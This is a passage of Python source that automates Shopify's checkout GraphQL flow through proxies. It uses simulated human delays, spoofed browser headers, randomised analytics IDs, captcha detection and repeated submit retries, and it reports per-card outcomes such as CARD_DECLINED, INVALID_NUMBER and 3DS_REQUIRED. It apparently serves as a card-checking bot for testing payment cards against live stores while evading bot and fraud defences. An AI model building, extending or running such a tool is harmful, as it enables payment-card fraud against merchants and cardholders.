                fail_code = p2_parsed.get('failureCode', 'UNKNOWN_FAILURE')
                return False, f"PROPOSAL_BLOCKED: {fail_code}", gateway, total_price, currency

            # Log Proposal 2 errors (non-fatal)
            if p2_parsed['errors']:
                warn_codes = [e.get('code', '') for e in p2_parsed['errors'][:3]]
                print(f'[PROPOSAL2] warnings: {warn_codes}', file=sys.stderr)

            print(f'[PROPOSAL2] result_type={p2_parsed["result_type"]} checkout_total={total_price} tax={tax_total}', file=sys.stderr)

            # Update seller_digest from PROPOSAL2 response (may differ from PROPOSAL1)
            _p2_digest = p2_parsed.get('seller_digest') or ''
            if _p2_digest and _p2_digest != _seller_digest:
                print(f'[MERCH_FIX] PROPOSAL2 gave new digest={_p2_digest[:16]}... (was {_seller_digest[:16] if _seller_digest else "none"})', file=sys.stderr)
                _seller_digest = _p2_digest
                # Rebuild merch_line with updated digest
                merch_line = _build_merchandise_line(
                    variant_id=variant_id or product_id_for_cart,
                    product_id=product_numeric_id,
                    price=price,
                    currency=currency,
                    title=product_title,
                    requires_shipping=requires_shipping,
                    quantity=1,
                    digest=_seller_digest,
                )
            elif _p2_digest:
                print(f'[MERCH_FIX] PROPOSAL2 digest unchanged: {_p2_digest[:16]}...', file=sys.stderr)
            else:
                print(f'[MERCH_FIX] PROPOSAL2 returned no digest', file=sys.stderr)

            await human_delay(step_name="proposal2")

            # ======== STEP 11: submitForCompletion ========
            if not receipt_id:
                # Build NegotiationInput for submitForCompletion.
                # Unlike SessionNegotiationInput (negotiate query), NegotiationInput:
                # - Does NOT use purchaseProposal wrapper
                # - Has fields directly: merchandise, delivery, payment, buyerIdentity, etc.
                # - Requires sessionInput: {sessionToken: "..."}
                # - Has queueToken at top level
                #
                # CRITICAL FIX v5: The MERCHANDISE_SIGNATURE_MISMATCH error occurs because
                # the sourceProvidedMerchandise data we send doesn't exactly match the
                # server's internal merchandise record. The server computes a "signature"
                # (hash) of the merchandise fields and compares it to what we provide.
                #
                # ROOT CAUSES of the mismatch:
                # 1. Using REST API IDs instead of Storefront API IDs (usually same, not guaranteed)
                # 2. Using product title instead of variant title
                # 3. Price discrepancy (price changed since we fetched from /products.json)
                # 4. Missing or wrong field values (taxable, giftCard, properties, etc.)
                #
                # FIX STRATEGY:
                # - We now extract the server-confirmed variant GID from the cart response
                # - We now extract seller-confirmed merchandise from the negotiate response
                # - For the submit step, we send stableId + sourceProvidedMerchandise with
                #   server-confirmed values, plus quantity and expectedTotalPrice
                # - The stableId ties the line to the server's session state
                # - The sourceProvidedMerchandise must EXACTLY match what the server has
                submit_merch_lines = []
                if stable_ids:
                    for sid in stable_ids:
                        _ml = dict(merch_line)
                        _ml['stableId'] = sid
                        submit_merch_lines.append(_ml)
                else:
                    submit_merch_lines = [merch_line]

                pp = payment_proposal_input.get('purchaseProposal', payment_proposal_input)

                # Update pp['payment'] totalAmount with final confirmed total from PROPOSAL2
                if pp.get('payment') and total_price and total_price != '0':
                    pp['payment']['totalAmount'] = {'value': {'amount': str(total_price), 'currencyCode': currency}}
                    for _pl in pp['payment'].get('paymentLines', []):
                        _pl['amount'] = {'value': {'amount': str(total_price), 'currencyCode': currency}}
                    print(f'[SUBMIT_PP] Updated payment totalAmount to {total_price} {currency}', file=__import__("sys").stderr)

                # Build delivery for submit step.
                # KEY FIX for DELIVERY_DELIVERY_LINE_DETAIL_CHANGED v3:
                # The previous approach rebuilt delivery from scratch using _build_delivery_line(),
                # which created a structure that differed from what the server confirmed.
                # The server validates our delivery line fields EXACTLY against its
                # FilledDeliveryTerms — any mismatch in structure, field names, or values
                # triggers DELIVERY_DELIVERY_LINE_DETAIL_CHANGED.
                #
                # NEW STRATEGY: Use the server-confirmed delivery lines (server_delivery_lines)
                # DIRECTLY. These come from the FilledDeliveryTerms in the negotiate response
                # and are already in the exact DeliveryLineInput format the server expects.
                # We only need to:
                # 1. Inject the destination address if the server didn't provide one
                # 2. Use the server's exact expectedTotalPrice (not a calculated one)
                # 3. Use the server's exact targetMerchandiseLines
                submit_delivery = pp.get('delivery')
                if is_shipping_required and stable_ids:
                    if server_delivery_lines:
                        # Use server-confirmed delivery lines directly — this is the
                        # authoritative source of truth. The server confirmed these exact
                        # values in FilledDeliveryTerms, so they MUST match.
                        _submit_dl_list = []
                        for sdl in server_delivery_lines:
                            _sdl = dict(sdl)  # shallow copy
                            # Inject destination address if server didn't provide one
                            if 'destination' not in _sdl or not _sdl.get('destination'):
                                _sdl['destination'] = {
                                    'streetAddress': {
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'address1': street,
                                        'address2': '',
                                        'city': city,
                                        'countryCode': country_code,
                                        'zoneCode': state,
                                        'postalCode': s_zip,
                                        'phone': phone,
                                    },
                                }
                            else:
                                # Server provided a destination — verify it has required fields
                                _dest = _sdl.get('destination') or {}
                                _sa = _dest.get('streetAddress') or {}
                                # Fill in any missing address fields from our buyer data
                                if not _sa.get('firstName'):
                                    _sa['firstName'] = firstName
                                if not _sa.get('lastName'):
                                    _sa['lastName'] = lastName
                                if not _sa.get('address1'):
                                    _sa['address1'] = street
                                if not _sa.get('city'):
                                    _sa['city'] = city
                                if not _sa.get('countryCode'):
                                    _sa['countryCode'] = country_code
                                if not _sa.get('zoneCode'):
                                    _sa['zoneCode'] = state
                                if not _sa.get('postalCode'):
                                    _sa['postalCode'] = s_zip
                                if not _sa.get('phone'):
                                    _sa['phone'] = phone
                                _sdl['destination'] = {'streetAddress': _sa}
                            _submit_dl_list.append(_sdl)
                        submit_delivery = _build_delivery_terms(
                            delivery_lines=_submit_dl_list,
                            no_delivery_required=[],
                        )
                        _submit_handle = 'shipping'
                        _submit_price = None
                        if server_delivery_lines:
                            _submit_handle = _dget(server_delivery_lines[0], 'selectedDeliveryStrategy', 'deliveryStrategyByHandle', 'handle') or 'shipping'
                            _ep = server_delivery_lines[0].get('expectedTotalPrice') or {}
                            if _ep and 'value' in _ep:
                                _submit_price = (_ep.get('value') or {}).get('amount', '')
                        print(f'[SUBMIT_DL] Using server delivery: handle={_submit_handle} server_price={_submit_price} lines={len(_submit_dl_list)}', file=sys.stderr)
                        # Debug: print the full delivery structure for comparison
                        for _di, _dline in enumerate(_submit_dl_list):
                            print(f'[SUBMIT_DL] Line {_di}: {json.dumps(_dline, default=str)[:500]}', file=sys.stderr)
                    else:
                        # Fallback: no server_delivery_lines available — build from scratch
                        # This should rarely happen if the negotiate response is parsed correctly
                        _exact_ship_amount = None
                        if total_price and total_price != '0':
                            try:
                                _total_f = float(total_price)
                                _price_f = float(price) if price else 0
                                _ship_est = max(0, _total_f - _price_f)
                                if _ship_est > 0:
                                    _exact_ship_amount = f'{_ship_est:.2f}'
                            except (ValueError, TypeError):
                                pass
                        
                        submit_delivery_line = _build_delivery_line(
                            currency=currency,
                            first_name=firstName,
                            last_name=lastName,
                            street=street,
                            city=city,
                            country_code=country_code,
                            zone_code=state,
                            postal_code=s_zip,
                            phone=phone,
                            shipping_handle=selected_handle,
                            shipping_amount=_exact_ship_amount,
                        )
                        # Always use {any:true} — stableIds rotate after each negotiate
                        submit_delivery_line['targetMerchandiseLines'] = {'any': True}
                        submit_delivery = _build_delivery_terms(
                            delivery_lines=[submit_delivery_line],
                            no_delivery_required=[],
                        )
                        print(f'[SUBMIT_DL] Fallback built delivery: handle={selected_handle} exact_price={_exact_ship_amount}', file=sys.stderr)

                submit_input = {
                    'sessionInput': {'sessionToken': x_checkout_one_session_token},
                    'merchandise': pp.get('merchandise'),
                    'delivery': submit_delivery,
                    'payment': pp.get('payment'),
                    'buyerIdentity': pp.get('buyerIdentity'),
                    'discounts': pp.get('discounts'),
                    'taxes': pp.get('taxes'),
                    'note': pp.get('note'),
                    'localizationExtension': pp.get('localizationExtension'),
                    'scriptFingerprint': pp.get('scriptFingerprint'),
                    'optionalDuties': pp.get('optionalDuties'),
                    'cartMetafields': pp.get('cartMetafields', []),
                    'memberships': pp.get('memberships'),
                    'tip': pp.get('tip'),
                    'queueToken': queue_token or '',
                    'checkpointData': '',
                }
                # Remove None values
                submit_input = {k: v for k, v in submit_input.items() if v is not None}
                print(f'[DEBUG_ACTUAL_DL] submit delivery={submit_input.get("delivery",{})}', file=sys.stderr)

                submit_data = {
                    'query': MUTATION_SUBMIT,
                    'variables': {
                        'input': submit_input,
                        'attemptToken': attempt_token,
                        'metafields': [],
                        'analytics': {
                            'requestUrl': checkout_url,
                            'pageId': f'{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}',
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }

                print(f'[SUBMIT_TOTAL] total_price={total_price} currency={currency} queueToken={str(queue_token)[:20] if queue_token else "NONE"} sessionToken={str(x_checkout_one_session_token)[:20] if x_checkout_one_session_token else "NONE"}', file=sys.stderr)
                # Debug: print full submit input (truncated)
                import json as _dbg_json
                _dbg_input = {k: v for k, v in submit_input.items() if k not in ('delivery', 'payment')}
                print(f'[SUBMIT_INPUT_DEBUG] keys={sorted(submit_input.keys())} queueToken={str(submit_input.get("queueToken",""))[:30]}... sessionInput={submit_input.get("sessionInput",{})}', file=sys.stderr)
                print(f'[SUBMIT_INPUT] merchandise keys={list(submit_input.get("merchandise",{}).keys())} payment_keys={list((submit_input.get("payment") or {}).keys())} delivery_keys={list((submit_input.get("delivery") or {}).keys())}', file=sys.stderr)
                if submit_input.get('payment'):
                    _pay = submit_input['payment']
                    print(f'[SUBMIT_INPUT] payment: totalAmount={bool(_pay.get("totalAmount"))} paymentLines={len(_pay.get("paymentLines",[]))}', file=sys.stderr)
                    print(f'[SUBMIT_PAYMENT_JSON] {json.dumps(_pay)[:2000]}', file=sys.stderr)
                    for _pl in _pay.get('paymentLines',[])[:2]:
                        _pm = _pl.get('paymentMethod',{})
                        print(f'[SUBMIT_INPUT]   paymentMethod keys={list(_pm.keys())}', file=sys.stderr)
                # Add dynamic per-submit Shopify headers (present in real browser)
                checkout_web_headers['shopify-checkout-source'] = f'id="{source_token}", type="cn"'
                checkout_web_headers['shopify-checkout-event-ids'] = f'extensibility:submitForCompletion:{str(uuid.uuid4())}'

                # ── Wait for payment artifacts to be ready ──────────────────────────────
                # REQUIRED_ARTIFACTS_UNAVAILABLE means Shopify's fraud/risk engine
                # is still computing async scores. Poll Proposal until that error
                # disappears (real browser does the same — shows spinner during this).
                _artifacts_ready = False
                _artifacts_polls = 0
                _max_artifacts_polls = 8
                while not _artifacts_ready and _artifacts_polls < _max_artifacts_polls:
                    _artifacts_polls += 1
                    await asyncio.sleep(1.2)
                    _art_poll_data = {
                        'query': QUERY_PROPOSAL,
                        'variables': {
                            'input': {
                                'purchaseProposal': pp,
                                'queueToken': queue_token or '',
                            },
                        },
                        'operationName': 'Proposal',
                    }
                    _art_resp, _ = await retry_on_429(
                        lambda: session.post(
                            graphql_url,
                            params={'operationName': 'Proposal'},
                            headers=checkout_web_headers,
                            json=_art_poll_data,
                            proxy=proxy, timeout=20, allow_redirects=True
                        ),
                        step_name="artifacts_poll", max_retries=1, base_delay=2.0, max_delay=6.0
                    )
                    if _art_resp and _art_resp.status_code == 200:
                        _refresh_session_token(_art_resp)
                        try:
                            _art_json = json.loads(_art_resp.text)
                            _art_parsed = _parse_negotiate_response(_art_json)
                            _art_errors = [e.get('code','') for e in _art_parsed.get('errors', [])]
                            # MUST update queue token from artifacts poll — each negotiate
                            # consumes the old queue token and returns a new one. If we don't
                            # update, the submit uses a stale (consumed) token → UnavailableTerms.
                            if _art_parsed.get('queue_token'):
                                print(f'[ARTIFACTS] queue_token updated: {str(queue_token)[:20]}... → {str(_art_parsed["queue_token"])[:20]}...', file=sys.stderr)
                                queue_token = _art_parsed['queue_token']
                                submit_data['variables']['input']['queueToken'] = queue_token
                            if _art_parsed.get('session_token'):
                                print(f'[ARTIFACTS] session_token updated: {str(x_checkout_one_session_token)[:20]}... → {str(_art_parsed["session_token"])[:20]}...', file=sys.stderr)
                                x_checkout_one_session_token = _art_parsed['session_token']
                                checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                                checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'
                                submit_data['variables']['input']['sessionInput'] = {'sessionToken': x_checkout_one_session_token}
                            # Debug: show what the artifacts poll returned
                            print(f'[ARTIFACTS_POLL] result_type={_art_parsed.get("result_type","?")} delivery_resolved={_art_parsed.get("delivery_resolved","?")} checkout_total={_art_parsed.get("checkout_total","?")} errors={_art_errors}', file=sys.stderr)
                            # Update total from poll if changed
                            if _art_parsed.get('checkout_total') and _art_parsed['checkout_total'] != '0':
                                _new_ct = _art_parsed['checkout_total']
                                _new_cur = _art_parsed.get('checkout_total_currency', currency)
                                if _new_ct != total_price:
                                    total_price = _new_ct
                                    currency = _new_cur
                                    pp['payment']['totalAmount'] = {'value': {'amount': str(total_price), 'currencyCode': currency}}
                                    for _pl in pp['payment'].get('paymentLines', []):
                                        _pl['amount'] = {'value': {'amount': str(total_price), 'currencyCode': currency}}
                                    submit_data['variables']['input']['payment'] = pp['payment']
                            # Update delivery from poll (keep fresh)
                            if _art_parsed.get('server_delivery_lines'):
                                server_delivery_lines = _art_parsed['server_delivery_lines']
                            if 'REQUIRED_ARTIFACTS_UNAVAILABLE' not in _art_errors:
                                _artifacts_ready = True
                                print(f'[ARTIFACTS] Ready after {_artifacts_polls} poll(s). Errors left: {_art_errors}', file=sys.stderr)
                                break
                            else:
                                print(f'[ARTIFACTS] Still waiting ({_artifacts_polls}/{_max_artifacts_polls})... errors={_art_errors}', file=sys.stderr)
                        except Exception as _ae:
                            print(f'[ARTIFACTS] Poll parse error: {_ae}', file=sys.stderr)
                if not _artifacts_ready:
                    print(f'[ARTIFACTS] Timeout after {_max_artifacts_polls} polls — proceeding anyway', file=sys.stderr)

                await human_delay(min_sec=0.3, max_sec=0.8, step_name="submit")

                # Retry submit up to 3 times
                submit_resp = None
                for _submit_attempt in range(3):
                    submit_resp, _ = await retry_on_429(
                        lambda: session.post(
                            graphql_url,
                            params={'operationName': 'SubmitForCompletion'},
                            headers=checkout_web_headers,
                            json=submit_data,
                            proxy=proxy, timeout=20, allow_redirects=True
                        ),
                        step_name="submit", max_retries=1, base_delay=3.0, max_delay=12.0
                    )
                    if submit_resp and ("success" in submit_resp.text.lower() or "SubmittedForCompletion" in submit_resp.text):
                        break
                    if _submit_attempt < 2:
                        await asyncio.sleep(1)

                if not submit_resp or submit_resp.status_code != 200:
                    _submit_status = submit_resp.status_code if submit_resp else 'N/A'
                    return False, f"SUBMIT_BLOCKED: HTTP {_submit_status}", gateway, total_price, currency

                submit_text = submit_resp.text
                print(f'[SUBMIT] Raw response FULL: {submit_text}', file=sys.stderr)

                if is_captcha_required(submit_text):
                    return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency

                _refresh_session_token(submit_resp)

                # Check for specific submit errors
                if "TAX_NEW_TAX_VALUE_MUST_BE_ACCEPTED" in submit_text or "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_text:
                    return False, "TAX_MISMATCH", gateway, total_price, currency
                if "CAPTCHA_METADATA_MISSING" in submit_text:
                    return False, "HCAPTCHA_REQUIRED", gateway, total_price, currency
                if "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in submit_text:
                    return False, "CARD_EXPIRED", gateway, total_price, currency
                if "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED" in submit_text:
                    return False, "CARD_NOT_SUPPORTED", gateway, total_price, currency
                if "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT" in submit_text:
                    return False, "INVALID_NUMBER", gateway, total_price, currency
                if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in submit_text:
                    # DON'T return immediately — this often means the delivery/tax changed
                    # and we need to re-negotiate with the updated amount. The retry block
                    # below will handle this by re-negotiating and resubmitting.
                    print(f'[SUBMIT] PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT — will re-negotiate and retry', file=sys.stderr)

                # Extract receipt_id from submit response
                # The submitForCompletion returns SubmitForCompletionResult union:
                # SubmitSuccess, SubmittedForCompletion, SubmitFailed, SubmitRejected, etc.
                #
                # FIX v4: SubmitRejected may NOT have __typename — it has {errors: [...]}
                # directly. We check for errors at the top level of submitForCompletion
                # as well as checking __typename. Also, MERCHANDISE_SIGNATURE_MISMATCH
                # and DELIVERY_DELIVERY_LINE_DETAIL_CHANGED are NON-BLOCKING warnings
                # that appear in submit errors but should NOT prevent receipt creation.
                # The real Shopify checkout treats these as advisory and the receipt
                # is still returned. If we only get these warnings, we should retry.
                try:
                    submit_json = json.loads(submit_text)
                    _submit_data = submit_json.get("data") or {}
                    _submit_result = _submit_data.get("submitForCompletion") or {}
                    # Handle data:null with top-level errors (e.g. INVALID_STABLE_ID)
                    if not _submit_result and submit_json.get("errors"):
                        _top_err_codes = [e.get("extensions", {}).get("code", "") or e.get("code","") for e in submit_json["errors"]]
                        print(f'[SUBMIT] data=null top-level errors: {_top_err_codes}', file=sys.stderr)
                        # These are schema/variable errors — treat as transient, fall through to retry
                    
                    # Collect submit errors (both from result and top-level)
                    _submit_errors = _submit_result.get('errors', []) if _submit_result else []
                    _top_errors = submit_json.get('errors', [])
                    _all_submit_errors = _submit_errors + _top_errors
                    
                    _submit_result_type = _submit_result.get('__typename', '') if _submit_result else ''
                    
                    # Filter out non-blocking warnings
                    _NON_BLOCKING_CODES = {
                        'MERCHANDISE_SIGNATURE_MISMATCH',
                        'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
                        'REQUIRED_ARTIFACTS_UNAVAILABLE',
                        'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
                    }
                    _blocking_errors = [e for e in _all_submit_errors if e.get('code', '') not in _NON_BLOCKING_CODES]
                    _warning_errors = [e for e in _all_submit_errors if e.get('code', '') in _NON_BLOCKING_CODES]
                    
                    if _warning_errors:
                        _warn_codes = [e.get('code', '') for e in _warning_errors[:3]]
                        print(f'[SUBMIT] Non-blocking warnings: {_warn_codes}', file=sys.stderr)
                    
                    if _submit_result_type in ('SubmitSuccess', 'SubmittedForCompletion'):
                        _submit_receipt = _submit_result.get('receipt') or {}
                        if _submit_receipt:
                            receipt_id = _submit_receipt.get('id')
                            if _submit_receipt.get('__typename') == 'FailedReceipt':
                                pe = _submit_receipt.get('processingError') or {}
                                _pe_type = pe.get('__typename', '') if pe else ''
                                if _pe_type == 'InventoryClaimFailure':
                                    return False, "INVENTORY_CLAIM_FAILURE: Item out of stock during payment", gateway, total_price, currency
                                if pe.get('hasOffsitePaymentMethod'):
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                _ext = _extract_payment_error_response(pe)
                                return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                        _submit_config_id = _submit_result.get('configurationRecordId')
                    elif _submit_result_type == 'SubmitFailed':
                        reason = _submit_result.get('reason', 'Unknown failure')
                        return False, f"SUBMIT_FAILED: {reason}", gateway, total_price, currency
                    elif _submit_result_type == 'SubmitRejected' or (_blocking_errors and not receipt_id):
                        # SubmitRejected — may or may not have __typename
                        # If we have blocking errors, treat as rejection
                        if _blocking_errors:
                            # Format: "CODE:message" so the real error code is preserved
                            # through extract_clean_response() instead of being stripped to
                            # just "SUBMIT_REJECTED". This makes the user-facing response
                            # actually useful for debugging.
                            rej_msgs = []
                            for e in _blocking_errors[:3]:
                                _code = e.get('code', '') or (e.get('extensions') or {}).get('code', '') or 'UNKNOWN'
                                _msg = e.get('localizedMessage') or e.get('message', '')
                                _msg = (_msg[:120] if isinstance(_msg, str) else str(_msg)[:120])
                                rej_msgs.append(f"{_code}:{_msg}" if _msg else _code)
                            return False, f"SUBMIT_REJECTED: {'; '.join(rej_msgs)}", gateway, total_price, currency
                    elif _submit_result_type == 'CheckpointDenied':
                        _redirect_url = _submit_result.get('redirectUrl', '')
                        if _redirect_url:
                            return False, f"CAPTCHA_BLOCK: CheckpointDenied redirect={_redirect_url}", gateway, total_price, currency
                        return False, "CAPTCHA_BLOCK: CheckpointDenied on submit", gateway, total_price, currency
                    elif _submit_result_type == 'Throttled':
                        _poll_after = _submit_result.get('pollAfter', 0)
                        _new_queue_token = _submit_result.get('queueToken', '')
                        if _new_queue_token:
                            queue_token = _new_queue_token
                        if _poll_after and _poll_after > 0:
                            _wait_sec = _poll_after / 1000.0
                            print(f'[SUBMIT] Throttled - waiting {_wait_sec:.1f}s then retrying with new queueToken', file=sys.stderr)
                            await asyncio.sleep(min(_wait_sec, 10.0))
                            attempt_token = str(uuid.uuid4())
                            submit_data['variables']['attemptToken'] = attempt_token
                            submit_data['variables']['input']['queueToken'] = queue_token or ''
                            submit_data['variables']['input']['sessionInput'] = {'sessionToken': x_checkout_one_session_token}
                            _thr_resp, _ = await retry_on_429(
                                lambda: session.post(
                                    graphql_url,
                                    params={'operationName': 'SubmitForCompletion'},
                                    headers=checkout_web_headers,
                                    json=submit_data,
                                    proxy=proxy, timeout=20, allow_redirects=True
                                ),
                                step_name="submit_throttle_retry", max_retries=1, base_delay=3.0, max_delay=8.0
                            )
                            if _thr_resp and _thr_resp.status_code == 200:
                                _refresh_session_token(_thr_resp)
                                try:
                                    _thr_json = json.loads(_thr_resp.text)
                                    _thr_result = (_thr_json.get("data") or {}).get("submitForCompletion") or {}
                                    _thr_type = _thr_result.get('__typename', '')
                                    print(f'[SUBMIT_THROTTLE_RETRY] __typename={_thr_type}', file=sys.stderr)
                                    if _thr_type in ('SubmitSuccess', 'SubmittedForCompletion'):
                                        _tr = _thr_result.get('receipt') or {}
                                        if _tr:
                                            receipt_id = _tr.get('id')
                                            if _tr.get('__typename') == 'FailedReceipt':
                                                pe = _tr.get('processingError') or {}
                                                _ext = _extract_payment_error_response(pe)
                                                return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                                    elif _thr_type == 'CheckpointDenied':
                                        _rurl = _thr_result.get('redirectUrl', '')
                                        return False, f"CAPTCHA_BLOCK: {_rurl or 'CheckpointDenied'}", gateway, total_price, currency
                                    elif _thr_type == 'SubmitFailed':
                                        return False, f"SUBMIT_FAILED: {_thr_result.get('reason', '')}", gateway, total_price, currency
                                except (json.JSONDecodeError, KeyError) as e:
                                    print(f'[SUBMIT_THROTTLE_RETRY] Parse error: {e}', file=sys.stderr)
                        return False, "SUBMIT_BLOCKED: Throttled", gateway, total_price, currency
                    elif _submit_result_type == 'TooManyAttempts':
                        return False, "SUBMIT_BLOCKED: TooManyAttempts", gateway, total_price, currency
                    elif _submit_result_type == 'TooManyRequests':
                        _retry_after = _submit_result.get('retryAfter', 0)
                        if _retry_after and _retry_after > 0:
                            _wait_sec = _retry_after / 1000.0
                            print(f'[SUBMIT] TooManyRequests - waiting {_wait_sec:.1f}s then retrying', file=sys.stderr)
                            await asyncio.sleep(min(_wait_sec, 10.0))
                            attempt_token = str(uuid.uuid4())
                            submit_data['variables']['attemptToken'] = attempt_token
                            submit_data['variables']['input']['queueToken'] = queue_token or ''
                            submit_data['variables']['input']['sessionInput'] = {'sessionToken': x_checkout_one_session_token}
                            _tmr_resp, _ = await retry_on_429(
                                lambda: session.post(
                                    graphql_url,
                                    params={'operationName': 'SubmitForCompletion'},
                                    headers=checkout_web_headers,
                                    json=submit_data,
                                    proxy=proxy, timeout=20, allow_redirects=True
                                ),
                                step_name="submit_tmr_retry", max_retries=1, base_delay=3.0, max_delay=8.0
                            )
                            if _tmr_resp and _tmr_resp.status_code == 200:
                                _refresh_session_token(_tmr_resp)
                                try:
                                    _tmr_json = json.loads(_tmr_resp.text)
                                    _tmr_result = (_tmr_json.get("data") or {}).get("submitForCompletion") or {}
                                    _tmr_type = _tmr_result.get('__typename', '')
                                    print(f'[SUBMIT_TMR_RETRY] __typename={_tmr_type}', file=sys.stderr)
                                    if _tmr_type in ('SubmitSuccess', 'SubmittedForCompletion'):
                                        _tr = _tmr_result.get('receipt') or {}
                                        if _tr:
                                            receipt_id = _tr.get('id')
                                            if _tr.get('__typename') == 'FailedReceipt':
                                                pe = _tr.get('processingError') or {}
                                                _ext = _extract_payment_error_response(pe)
                                                return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                                except (json.JSONDecodeError, KeyError) as e:
                                    print(f'[SUBMIT_TMR_RETRY] Parse error: {e}', file=sys.stderr)
                        return False, "SUBMIT_BLOCKED: TooManyRequests", gateway, total_price, currency
                    elif _submit_result_type == 'SubmitAlreadyAccepted':
                        # Already submitted — extract receipt from the response
                        _saa_receipt = _submit_result.get('receipt') or {}
                        if _saa_receipt:
                            _saa_type = _saa_receipt.get('__typename', '')
                            print(f'[SUBMIT] SubmitAlreadyAccepted receipt={_saa_type}', file=sys.stderr)
                            if _saa_type == 'ProcessedReceipt':
                                _order_url = _saa_receipt.get('orderStatusPageUrl', '')
                                if _order_url:
                                    return True, f"ORDER_PLACED: {_order_url}", gateway, total_price, currency
                                return True, "ORDER_PLACED", gateway, total_price, currency
                            if _saa_type == 'FailedReceipt':
                                pe = _saa_receipt.get('processingError') or {}
                                _pe_type = pe.get('__typename', '') if pe else ''
                                if _pe_type == 'InventoryClaimFailure':
                                    return False, "INVENTORY_CLAIM_FAILURE: Item out of stock during payment", gateway, total_price, currency
                                _ext = _extract_payment_error_response(pe)
                                return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                            if _saa_type in ('ProcessingReceipt', 'WaitingReceipt'):
                                receipt_id = _saa_receipt.get('id')
                            if _saa_type == 'ActionRequiredReceipt':
                                return True, "3DS_REQUIRED", gateway, total_price, currency
                        # No receipt — fall through to poll
                        pass
                    elif not _submit_result_type and _all_submit_errors and not _blocking_errors:
                        # No __typename, only non-blocking warnings — treat as success
                        # The server accepted but returned warnings. Try polling.
                        print(f'[SUBMIT] No __typename but only non-blocking warnings — attempting poll', file=sys.stderr)
                        # Generate a receipt_id from the submit text
                        _receipt_match = re.search(r'"id"\s*:\s*"([^"]+)"', submit_text)
                        if _receipt_match:
                            receipt_id = _receipt_match.group(1)
                        else:
                            # No receipt in response — the submit may have been silently accepted
                            # Try one more submit with fresh attemptToken
                            pass

                    if not receipt_id:
                        # FIX v5: If submit returned only non-blocking warnings
                        # (MERCHANDISE_SIGNATURE_MISMATCH, DELIVERY_DELIVERY_LINE_DETAIL_CHANGED),
                        # the server hasn't actually processed the payment. We need to
                        # re-negotiate to update the server's state with the corrected
                        # data, then retry submit. This is what the real Shopify checkout does.
                        #
                        # KEY INSIGHT: The SubmitRejected response now includes sellerProposal
                        # with the EXACT delivery data the server expects. We should use that
                        # directly instead of rebuilding from scratch.
                        print(f'[SUBMIT] No receipt_id — re-negotiating then retrying submit', file=sys.stderr)
                        
                        # First, try to extract sellerProposal from SubmitRejected response
                        # This contains the EXACT delivery data the server wants
                        _rejected_seller = (_submit_result.get('sellerProposal') or {}) if _submit_result else {}
                        _rejected_delivery_lines = []
                        if _rejected_seller:
                            _rej_delivery = _rejected_seller.get('delivery') or {}
                            if _rej_delivery.get('__typename') == 'FilledDeliveryTerms':
                                for _rdl in _rej_delivery.get('deliveryLines', []):
                                    _rdl_entry = {
                                        'deliveryMethodTypes': _rdl.get('deliveryMethodTypes', ['SHIPPING']),
                                    }
                                    
                                    # ─── selectedDeliveryStrategy (UNION response → INPUT conversion) ───
                                    # Response types: CompleteDeliveryStrategy | CustomDeliveryStrategy |
                                    #   DeliveryStrategyMatcher | DeliveryStrategyReference
                                    # INPUT: deliveryStrategyByHandle: {handle, customDeliveryRate}
                                    _rstrat = _rdl.get('selectedDeliveryStrategy') or {}
                                    _rstrat_type = _rstrat.get('__typename', '') if _rstrat else ''
                                    _rhandle = ''
                                    if _rstrat_type == 'CompleteDeliveryStrategy':
                                        _rhandle = _rstrat.get('handle', '')
                                    elif _rstrat_type == 'DeliveryStrategyReference':
                                        _rhandle = _rstrat.get('handle', '')
                                    _rdl_entry['selectedDeliveryStrategy'] = {
                                        'deliveryStrategyByHandle': {
                                            'handle': _rhandle or 'shipping',
                                            'customDeliveryRate': False,
                                        },
                                    }
                                    
                                    # ─── totalAmount (MoneyConstraint response) → expectedTotalPrice (INPUT) ───
                                    _rtotal = _rdl.get('totalAmount') or {}
                                    _rtotal_type = _rtotal.get('__typename', '') if _rtotal else ''
                                    if _rtotal_type == 'AnyConstraint' or (_rtotal and _rtotal.get('any')):
                                        _rdl_entry['expectedTotalPrice'] = {'any': True}
                                    else:
                                        _amt, _cur = _extract_money(_rtotal)
                                        if _amt and _amt != '0':
                                            _rdl_entry['expectedTotalPrice'] = {'value': {'amount': _amt, 'currencyCode': _cur or 'USD'}}
                                        else:
                                            _rdl_entry['expectedTotalPrice'] = {'any': True}
                                    
                                    # ─── targetMerchandise (UNION response) → targetMerchandiseLines (INPUT) ───
                                    _rtm = _rdl.get('targetMerchandise') or {}
                                    _rtm_type = _rtm.get('__typename', '') if _rtm else ''
                                    if _rtm_type == 'AnyMerchandiseLineTargetCollection' or (_rtm and _rtm.get('any')):
                                        _rdl_entry['targetMerchandiseLines'] = {'any': True}
                                    elif _rtm_type == 'FilledMerchandiseLineTargetCollection':
                                        # linesV2 is requested with stableId in MUTATION_SUBMIT.
                                        # If stableId is missing/empty, fall back to {any: True}
                                        # — NEVER produce {lines: []} (causes DELIVERY_DELIVERY_LINE_DETAIL_CHANGED).
                                        _lines_v2 = _rtm.get('linesV2', [])
                                        _rtm_stable_ids = [l.get('stableId') for l in _lines_v2 if l.get('stableId')]
                                        if _rtm_stable_ids:
                                            _rdl_entry['targetMerchandiseLines'] = {
                                                'lines': [{'stableId': sid} for sid in _rtm_stable_ids]
                                            }
                                        else:
                                            _rdl_entry['targetMerchandiseLines'] = {'any': True}
                                    else:
                                        _rdl_entry['targetMerchandiseLines'] = {'any': True}
                                    
